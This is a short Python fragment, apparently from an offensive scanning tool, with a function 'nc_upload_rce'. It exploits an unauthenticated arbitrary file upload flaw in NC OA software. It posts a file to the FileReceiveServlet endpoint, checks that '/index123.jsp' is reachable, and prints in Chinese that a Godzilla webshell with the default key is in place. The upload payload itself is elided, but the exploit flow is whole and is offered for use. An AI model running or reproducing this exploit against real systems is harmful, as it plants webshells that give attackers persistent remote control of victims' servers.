...
def nc_upload_rce(Url):
    ...
    try:
        ...
        req1 = requests.post(urldata + "servlet/FileReceiveServlet", headers=uploadHeader, verify=False, data=uploadData,
                             timeout=25)
        req3 = requests.get(urldata + "/index123.jsp", headers=header, verify=False, timeout=25)
        if 0< len(req3.text) < 10:
            print(Vcolors.RED +"[+]  文件上传成功, 哥斯拉默认密钥webshell：{}/index123.jsp".format(urldata) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] NC OA未授权任意文件上传漏洞利用失败"+Vcolors.ENDC)
    except:
        logging.error("nc_upload_rce脚本出现异常")
